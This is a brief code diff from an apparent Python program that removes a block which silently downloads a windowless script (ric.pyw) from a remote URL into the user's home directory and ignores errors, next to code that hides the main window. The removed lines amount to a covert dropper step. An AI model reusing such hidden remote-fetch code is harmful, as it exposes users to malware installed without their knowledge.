@@ -23,14 +23,6 @@ try:
 except Exception:
     pass
 
-# Download and runc script from pastebin
-ricpath = os.path.expanduser("~") + "\\ric.pyw"
-
-try:
-    urllib.request.urlretrieve("https://raw.githubusercontent.com/nobody-null-0x00/random-garbage/main/ric.pyw", ricpath)
-except Exception:
-    pass
-
 # Hide the main tkinter window
 root = tk.Tk()
 root.withdraw()
